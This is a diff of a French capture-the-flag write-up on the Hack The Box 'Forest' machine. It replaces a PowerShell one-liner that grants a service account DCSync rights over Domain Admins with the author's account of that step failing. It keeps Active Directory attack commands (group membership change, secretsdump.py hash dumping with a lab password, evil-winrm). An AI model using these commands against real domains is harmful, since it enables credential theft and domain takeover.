@@ -118,17 +118,16 @@ En résumer :
 * On fait un dump du hash admin (via mimikatz ou secretdump.py).
 
 ## Exploitation
-L'exploitation doit se faire rapidement, sinon nous perdons les groupes acquis. Donc un One-Liner powershell est fait içi, je reprend simplement les commandes expliquées dans
-bloodhound :
+Alors pour cette partie, rien ne passe, même en utilisant les solutions des autres write-up, la version de powershell de la box est 1.</br>
+J'ai tenté d'avoir le privilège DCSync par commande powershell et par aclpwn mais en powershell les commandes n'existent pas, et avec
+aclpwn j'ai problème sur problème. Je reviendrai peut être un jour (non.) pour finir.
+On peut bien rentrer dans le groupe Exchange Windows Permissions mais pas plus. La commande Add-domainObjectAcl n'existe pas sur powershell V1.
 ```bash
-Evil-winRM > Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco;
- $username = "htb\svc-alfresco"; $password = "s3rvice"; 
- $secstr = New-Object -TypeName System.Security.SecureString; 
- $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; 
- $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; 
- Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+Evil-winRM > Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco;
+#Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
 ```
+Si tout ce serai bien passé, on aurai juste eu à récolter les hash et à s'identifier avec (toujours avec evil-winrm) :
 ```bash
 $ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+$ evil-winrm 
 ```
-![Pic15](../img/forest15.PNG?raw=true) </br>
